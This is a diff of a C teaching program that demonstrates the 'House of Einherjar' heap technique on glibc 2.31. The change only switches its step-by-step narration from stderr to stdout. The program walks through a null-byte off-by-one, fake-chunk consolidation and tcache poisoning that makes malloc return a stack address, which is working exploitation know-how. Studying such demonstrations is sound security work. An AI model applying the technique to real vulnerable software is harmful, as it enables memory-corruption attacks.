@@ -21,113 +21,113 @@ int main()
     setbuf(stdin, NULL);
     setbuf(stdout, NULL);
 
-    fprintf(stderr, "Welcome to House of Einherjar 2!\n");
-    fprintf(stderr, "Tested on Ubuntu 20.04 64bit (glibc-2.31).\n");
-    fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
+    printf("Welcome to House of Einherjar 2!\n");
+    printf("Tested on Ubuntu 20.04 64bit (glibc-2.31).\n");
+    printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
 
-    fprintf(stderr, "This file demonstrates a tcache poisoning attack by tricking malloc into\n"
-                    "returning a pointer to an arbitrary location (in this case, the stack).\n");
+    printf("This file demonstrates a tcache poisoning attack by tricking malloc into\n"
+           "returning a pointer to an arbitrary location (in this case, the stack).\n");
 
     // prepare the target
     intptr_t stack_var[4];
-    fprintf(stderr, "\nThe address we want malloc() to return is %p.\n", (char *) &stack_var);
+    printf("\nThe address we want malloc() to return is %p.\n", (char *) &stack_var);
 
-    fprintf(stderr, "\nWe allocate 0x38 bytes for 'a' and use it to create a fake chunk\n");
+    printf("\nWe allocate 0x38 bytes for 'a' and use it to create a fake chunk\n");
     intptr_t *a = malloc(0x38);
 
     // create a fake chunk
-    fprintf(stderr, "\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n");
-    fprintf(stderr, "We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
+    printf("\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n");
+    printf("We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
 
     a[0] = 0;    // prev_size (Not Used)
     a[1] = 0x60; // size
     a[2] = (size_t) a; // fwd
     a[3] = (size_t) a; // bck
 
-    fprintf(stderr, "Our fake chunk at %p looks like:\n", a);
-    fprintf(stderr, "prev_size (not used): %#lx\n", a[0]);
-    fprintf(stderr, "size: %#lx\n", a[1]);
-    fprintf(stderr, "fwd: %#lx\n", a[2]);
-    fprintf(stderr, "bck: %#lx\n", a[3]);
+    printf("Our fake chunk at %p looks like:\n", a);
+    printf("prev_size (not used): %#lx\n", a[0]);
+    printf("size: %#lx\n", a[1]);
+    printf("fwd: %#lx\n", a[2]);
+    printf("bck: %#lx\n", a[3]);
 
-    fprintf(stderr, "\nWe allocate 0x28 bytes for 'b'.\n"
-                    "This chunk will be used to overflow 'b' with a single null byte into the metadata of 'c'\n"
-                    "After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n");
+    printf("\nWe allocate 0x28 bytes for 'b'.\n"
+           "This chunk will be used to overflow 'b' with a single null byte into the metadata of 'c'\n"
+           "After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n");
     uint8_t *b = (uint8_t *) malloc(0x28);
-    fprintf(stderr, "b: %p\n", b);
+    printf("b: %p\n", b);
 
     int real_b_size = malloc_usable_size(b);
-    fprintf(stderr, "Since we want to overflow 'b', we need the 'real' size of 'b' after rounding: %#x\n", real_b_size);
+    printf("Since we want to overflow 'b', we need the 'real' size of 'b' after rounding: %#x\n", real_b_size);
 
     /* In this case it is easier if the chunk size attribute has a least significant byte with
      * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
      * the chunk includes the amount requested plus some amount required for the metadata. */
-    fprintf(stderr, "\nWe allocate 0xf8 bytes for 'c'.\n");
+    printf("\nWe allocate 0xf8 bytes for 'c'.\n");
     uint8_t *c = (uint8_t *) malloc(0xf8);
 
-    fprintf(stderr, "c: %p\n", c);
+    printf("c: %p\n", c);
 
     uint64_t* c_size_ptr = (uint64_t*)(c - 8);
     // This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit
 
-    fprintf(stderr, "\nc.size: %#lx\n", *c_size_ptr);
-    fprintf(stderr, "c.size is: (0x100) | prev_inuse = 0x101\n");
+    printf("\nc.size: %#lx\n", *c_size_ptr);
+    printf("c.size is: (0x100) | prev_inuse = 0x101\n");
 
-    fprintf(stderr, "We overflow 'b' with a single null byte into the metadata of 'c'\n");
+    printf("We overflow 'b' with a single null byte into the metadata of 'c'\n");
     b[real_b_size] = 0;
-    fprintf(stderr, "c.size: %#lx\n", *c_size_ptr);
+    printf("c.size: %#lx\n", *c_size_ptr);
 
-    fprintf(stderr, "It is easier if b.size is a multiple of 0x100 so you "
-                    "don't change the size of b, only its prev_inuse bit\n");
+    printf("It is easier if b.size is a multiple of 0x100 so you "
+           "don't change the size of b, only its prev_inuse bit\n");
 
     // Write a fake prev_size to the end of b
-    fprintf(stderr, "\nWe write a fake prev_size to the last %lu bytes of 'b' so that "
-                    "it will consolidate with our fake chunk\n", sizeof(size_t));
+    printf("\nWe write a fake prev_size to the last %lu bytes of 'b' so that "
+           "it will consolidate with our fake chunk\n", sizeof(size_t));
     size_t fake_size = (size_t)((c - sizeof(size_t) * 2) - (uint8_t*) a);
-    fprintf(stderr, "Our fake prev_size will be %p - %p = %#lx\n", c - sizeof(size_t) * 2, a, fake_size);
+    printf("Our fake prev_size will be %p - %p = %#lx\n", c - sizeof(size_t) * 2, a, fake_size);
     *(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size;
 
     // Change the fake chunk's size to reflect c's new prev_size
-    fprintf(stderr, "\nMake sure that our fake chunk's size is equal to c's new prev_size.\n");
+    printf("\nMake sure that our fake chunk's size is equal to c's new prev_size.\n");
     a[1] = fake_size;
 
-    fprintf(stderr, "Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", a[1]);
+    printf("Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", a[1]);
 
     // Now we fill the tcache before we free chunk 'c' to consolidate with our fake chunk
-    fprintf(stderr, "\nFill tcache.\n");
+    printf("\nFill tcache.\n");
     intptr_t *x[7];
     for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
         x[i] = malloc(0xf8);
     }
 
-    fprintf(stderr, "Fill up tcache list.\n");
+    printf("Fill up tcache list.\n");
     for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
         free(x[i]);
     }
 
-    fprintf(stderr, "Now we free 'c' and this will consolidate with our fake chunk since 'c' prev_inuse is not set\n");
+    printf("Now we free 'c' and this will consolidate with our fake chunk since 'c' prev_inuse is not set\n");
     free(c);
-    fprintf(stderr, "Our fake chunk size is now %#lx (c.size + fake_prev_size)\n", a[1]);
+    printf("Our fake chunk size is now %#lx (c.size + fake_prev_size)\n", a[1]);
 
-    fprintf(stderr, "\nNow we can call malloc() and it will begin in our fake chunk\n");
+    printf("\nNow we can call malloc() and it will begin in our fake chunk\n");
     intptr_t *d = malloc(0x158);
-    fprintf(stderr, "Next malloc(0x158) is at %p\n", d);
+    printf("Next malloc(0x158) is at %p\n", d);
 
     // tcache poisoning
-    fprintf(stderr, "After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"
-                    "We have to create and free one more chunk for padding before fd pointer hijacking.\n");
+    printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"
+           "We have to create and free one more chunk for padding before fd pointer hijacking.\n");
     uint8_t *pad = malloc(0x28);
     free(pad);
 
-    fprintf(stderr, "\nNow we free chunk 'b' to launch a tcache poisoning attack\n");
+    printf("\nNow we free chunk 'b' to launch a tcache poisoning attack\n");
     free(b);
     printf("Now the tcache list has [ %p -> %p ].\n", b, pad);
 
-    fprintf(stderr, "We overwrite b's fwd pointer using chunk 'd'\n");
+    printf("We overwrite b's fwd pointer using chunk 'd'\n");
     d[0x30 / 8] = (long) stack_var;
 
     // take target out
-    fprintf(stderr, "Now we can cash out the target chunk.\n");
+    printf("Now we can cash out the target chunk.\n");
     malloc(0x28);
     intptr_t *e = malloc(0x28);
     printf("\nThe new chunk is at %p\n", e);
